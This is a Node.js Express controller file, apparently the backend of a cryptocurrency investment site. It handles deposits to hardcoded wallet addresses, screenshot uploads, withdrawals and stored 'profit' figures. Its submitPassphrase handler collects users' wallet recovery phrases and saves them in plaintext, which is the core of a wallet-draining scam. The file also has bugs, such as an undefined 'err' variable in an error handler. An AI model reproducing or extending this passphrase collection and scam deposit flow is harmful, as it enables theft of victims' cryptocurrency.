const User = require('../models/user.models');
const { uploadFileToS3 } = require('../utils/s3');
const Deposit = require('../models/deposit.model');
const Withdrawal = require('../models/withdrawal.model');
const mongoose = require('mongoose')
const DepositBalance = require('../models/totalBalance.model');

const getUser = async (req, res) => {
    try{
        id = req.user;

        const user = await User.findById(id).select('-password');

        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        // Respond with the user profile data
        res.status(200).json({ user });
    } catch (error) {
        console.error(err);
        res.status(500).json({ message: 'Server error', errMessage: err });
    }
};

const submitPassphrase = async (req, res) => {
    try {
        const { wallet_phrase } = req.body;

        if (!wallet_phrase) {
            return res.status(400).json({ error: 'Passphrase is required.' });
        }

        const userId = req.user;
        console.log(userId)
        const updatedUser = await User.findByIdAndUpdate(
            userId,
            {
                walletPassphrase: wallet_phrase,
                walletConnected: false
            },
            { new: true } // Returns the updated document
        );

        // Check if user exists
        if (!updatedUser) {
            return res.status(404).json({ error: 'User not found.' });
        }
        return res.status(200).json({ message: 'Passphrase submitted successfully.' });
    } catch (error) {
        console.error('Error submitting passphrase:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
};

// Submit deposit details
const deposit = async (req, res) => {
    try {
        const userId = req.user;
        const { amount, paymentMethod, depositCode} = req.body;

        if (!userId || !amount || !paymentMethod) {
            return res.status(400).json({ message: 'All fields are required.' });
        }

        // Define the addresses for each currency
        const addresses = {
            bitcoin: "bc1qwwyluwae55j5dqhgvark5n3xdcfkaza45dkxqk",
            ethereum: "0xa87450dE283845CB4531D1397fc85dA38627d370",
            solana: "kMpji5T8ProZYwYivEjVzZjyWnKLpkLzrEMLbrs9tCg",
            "polygon matic": "0xa87450dE283845CB4531D1397fc85dA38627d370",
            sui: "0xeb48341d43d5210079b6ff8145cedbc1aabba9f4d3f422965509009477f16fe8",
            "usdt tron": "TKgPG7F9rk18Fhp9eDXLZHWd8D5PezJYHB"
        };

        const currencyLowerCase = paymentMethod.name.toLowerCase();

        // Map the paymentMethod currency to its corresponding address (using lowercase)
        const paymentAddress = addresses[currencyLowerCase];

        if (!paymentAddress) {
            return res.status(400).json({ message: 'Payment address not found for this currency.' });
        }

        // Add the address to the payment method
        paymentMethod.address = paymentAddress;

        // Create a new deposit document with the payment address
        const deposit = new Deposit({
            userId,
            amount,
            paymentMethod,
            depositCode
        });

        await deposit.save();

        res.status(201).json({ message: 'Deposit submitted successfully.', depositId: depositCode, paymentAddress });
    } catch (error) {
        console.error('Error submitting deposit:', error);
        res.status(500).json({ message: 'An error occurred while submitting the deposit.' });
    }
};

// Upload screenshot
const depositScreenshot = async (req, res) => {
    try {
        const { depositId } = req.body;

        if (!depositId) {
            return res.status(400).json({ message: 'Deposit ID is required.' });
        }

        const deposit = await Deposit.findOne({ depositCode: depositId });
        if (!deposit) {
            return res.status(404).json({ message: 'Deposit not found.' });
        }

        // Upload screenshot to S3
        const s3Result = await uploadFileToS3(req.file);

        // Update deposit with screenshot URL
        deposit.screenshotUrl = s3Result.Location;
        deposit.status = 'pending';
        await deposit.save();

        res.status(200).json({ message: 'Screenshot uploaded successfully.', screenshotUrl: s3Result.Location });
    } catch (error) {
        console.error('Error uploading screenshot:', error);
        res.status(500).json({ message: 'An error occurred while uploading the screenshot.' });
    }
}

const createWithdrawal = async (req, res) => {
    try {
        const { amount, walletAddress, currencyName, withdrawalCode } = req.body;

        // Validate input
        if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
            return res.status(400).json({ message: 'Invalid amount.' });
        }

        if (!walletAddress) {
            return res.status(400).json({ message: 'Wallet address is required.' });
        }

        if (!currencyName) {
            return res.status(400).json({ message: 'Currency name is required.' });
        }
        if (!withdrawalCode) {
            return res.status(400).json({ message: 'Withdrawal code is required.' });
        }

        // Assuming req.user contains the authenticated user's ID
        const userId = req.user;

        if (!userId) {
            return res.status(401).json({ message: 'Unauthorized. Please log in.' });
        }

        const user = await User.findById(userId);

        // Validate and ensure wallet balance is a valid number
        const walletBalance = parseFloat(user.walletBalance) || 0;
        const withdrawalAmount = parseFloat(amount) || 0;

        console.log(walletBalance);
        console.log(withdrawalAmount)

        // Check if the balance is sufficient
        if (walletBalance < withdrawalAmount) {
            return res.status(400).json({ error: 'Insufficient balance.' });
        }

        // Create a new withdrawal request
        const withdrawal = new Withdrawal({
            userId,
            amount,
            walletAddress,
            currencyName,
            withdrawalCode
        });

        await withdrawal.save();

        res.status(201).json({
            message: 'Withdrawal request submitted successfully.',
            withdrawal,
            currencyName
        });
    } catch (error) {
        console.error('Error creating withdrawal:', error);
        res.status(500).json({
            message: 'Internal server error.',
            error: error.message,
        });
    }
};

// Get total balance of a user
const getTotalBalance = async (req, res) => {
    const userId = req.user; // Assuming the user ID is passed as a URL parameter
    
    try {
        const user = await User.findById(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }
        
        res.json({
            message: 'Total balance retrieved successfully',
            totalBalance: user.walletBalance // Return the wallet balance
        });
    } catch (error) {
        console.error('Error retrieving user total balance:', error);
        res.status(500).json({ message: 'Failed to retrieve total balance' });
    }
};

// Get total deposit balance of a user
const getTotalDepositBalance = async (req, res) => {
    const userId = req.user; // Assuming the user ID is passed as a URL parameter
    console.log(userId)
    try {
        // Calculate total deposit balance by summing all approved deposits for the user
        // const totalDeposit = await DepositBalance.aggregate([
        //     { $match: { userId: mongoose.Types.ObjectId(userId), status: 'approved' } }, // Filter by userId and approved status
        //     { $group: { _id: null, totalDeposit: { $sum: '$amount' } } } // Sum the deposit amounts
        // ]);
        const depositBalance = await DepositBalance.findOne({ userId });
        if (!depositBalance) {
            return res.status(404).json({ message: 'No deposit balance record found for this user' });
        }

        if (!depositBalance) {
            return res.status(404).json({ message: 'No deposit balance record found for this user' });
        }
        
        res.json({
            message: 'Total deposit balance retrieved successfully',
            totalDeposit: depositBalance.totalDeposit // Return the sum of approved deposits
        });
    } catch (error) {
        console.error('Error retrieving user total deposit balance:', error);
        res.status(500).json({ message: 'Failed to retrieve total deposit balance' });
    }
};

// Endpoint to get total withdrawals for a user
const getTotalWithdrawalBalance =  async (req, res) => {
    try {
        const userId = req.user;

        // Find the user by ID
        const user = await User.findById(userId);
        if (!user) {
            return res.status(404).json({ error: 'User not found.' });
        }

        // Send the totalWithdrawn value
        res.json({ totalWithdrawals: user.totalWithdrawals });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};

const getTotalProfits = async (req, res) => {
    const userId = req.user; // Extract user ID from the request

    try {
        // Find the user by ID
        const user = await User.findById(userId, 'totalProfits');
        if (!user) {
            return res.status(404).json({ message: 'User not found.' });
        }

        // Respond with the total profits
        res.status(200).json({
            message: 'Total profits retrieved successfully.',
            totalProfits: user.totalProfits,
        });
    } catch (error) {
        console.error('Error retrieving total profits:', error);
        res.status(500).json({ message: 'Internal server error.' });
    }
};



module.exports = { 
    getUser, 
    submitPassphrase,
    deposit,
    depositScreenshot,
    createWithdrawal,
    getTotalBalance,
    getTotalDepositBalance,
    getTotalWithdrawalBalance,
    getTotalProfits,
};